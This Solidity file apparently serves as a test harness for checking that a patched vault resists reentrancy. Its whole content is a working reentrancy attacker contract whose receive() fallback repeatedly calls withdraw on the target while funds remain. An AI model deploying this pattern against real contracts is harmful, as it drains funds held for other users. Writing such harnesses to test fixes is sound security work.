// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

interface IFixedVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract FixedVaultAttackHarness {
    IFixedVault public immutable target;
    uint256 public attackAmount;

    constructor(address _target) {
        target = IFixedVault(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "send eth");
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
}
